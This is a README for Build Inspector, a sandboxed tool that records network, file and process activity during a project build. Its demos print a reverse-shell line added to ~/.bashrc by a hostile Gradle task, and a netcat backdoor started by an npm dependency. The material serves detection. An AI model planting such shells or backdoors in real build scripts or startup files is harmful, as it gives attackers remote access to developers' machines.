# Build Inspector

[Build Inspector](https://github.com/sourceclear/build_inspector) is a
tool that gives insight into what's happening when you're building a
project. It is language and build system agnostic and it is capable of
inspecting network activities, file system changes and running
processes. All these happens in a sandboxed environment, without
compromising the developer's machine.

## Requirements

- [Ruby](https://www.ruby-lang.org/en/downloads/) (2.2.3 recommended)
- [Vagrant](https://www.vagrantup.com/)

Once you have both ruby and vagrant installed, go ahead and install
the sahara plugin and bundler. Lastly, clone this repository and pull
in the project's dependencies.

```
vagrant plugin install sahara
git clone https://github.com/sourceclear/build_inspector
gem install bundler
bundle install
```

## Running

First, make sure that you have the
[requirements](https://github.com/sourceclear/build_inspector#Requirements)
and you are inside the repository's directory.

```
cd build_inspector
```

Since this tool does not manage vagrant for you, yet, you'll have to
do it yourself. This step will take a while the first time, but won't
be necessary again. Eventually, this step will be eliminated. Start
vagrant and build the image:

``` vagrant up ```

Once vagrant is started, save a snapshot with:
```
vagrant sandbox on
```

### Usage

```
Usage inspector.rb [options] <git repo URL>
    -h, --help                       Display this screen
    -n, --no-rollback                Don't rollback the virtual machine's state after running
```

### Gradle Example

```
cp configs/gradle_inspect.yml .inspect.yml
ruby inspector.rb https://github.com/jsyeo/TotallyLegitApp.git
```

The above project has a task called `backdoor` that adds a reverse
connect shell to `~/.bashrc`.

After running, you should see this at the bottom of the output:

```
changed: ~/.bashrc
--- /backup/root/.bashrc	2014-02-19 21:43:56.000000000 -0500
+++ /root/.bashrc	2015-11-08 13:07:40.579626388 -0500
@@ -97,3 +97,5 @@
 #if [ -f /etc/bash_completion ] && ! shopt -oq posix; then
 #    . /etc/bash_completion
 #fi
+
+bash -c "bash -i>&/dev/tcp/localhost/1337 0>&1 &disown"&>/dev/null
```

In addition, you'll have a file that looks like
`201523110032412-TotallyLegitApp-evidence.zip` which has all the
network activity, file system changes, and any new processes.

### Bundler Example

```
cp configs/bundler_inspect.yml .inspect.yml
ruby inspector.rb https://github.com/jsyeo/harmless-project.git
```

This bundler project has a gem that pings google during its
installation.

Run it with the Build Inspector and you should see a list of domains
that the machine tried to connect to.

```
The following hostnames were reached during the build process:
  www.google.com (74.125.200.99)                                     543B
```

### NPM Example

```
cp configs/npm_inspect.yml .inspect.yml
ruby inspector.rb https://github.com/jsyeo/ann-pee-am
```

Inspecting this npm project should yield the following output:

```
The following processes were running during the build:
  - /bin/sh -i
  - nc -l 0.0.0.0 8080
```

That's because the npm project depends on a module that opens a
persistent backdoor using netcat.

### Configuration

The tool monitors all network and file system activities.  To ignore
hosts or exclude directories from the monitoring, create and add an
`.inspect.yml` in the repository.  The `.inspect.yml' file is simply
a YAML file that looks like this:

```
---

script: bundle install --jobs 2

whitelist:
  - 10.0.2.2
  - 8.8.8.8
  - bundler.rubygems.org
  - rubygems.org
  - rubygems.global.ssl.fastly.net

directories:
  excluded:
    - /home/vagrant/.gem
  included:
    - /etc
```

There are examples for different build systems in the `configs`
directory.  You may copy the approriate configs for your build system
to the root of this project or you may write one from scratch.

## Development

When you want to experiment, just do `vagrant sandbox on`. Make all
the changes you want to the image. If you'd like to keep them do
`vagrant sandbox commit` and if you don't do `vagrant sandbox
rollback`.
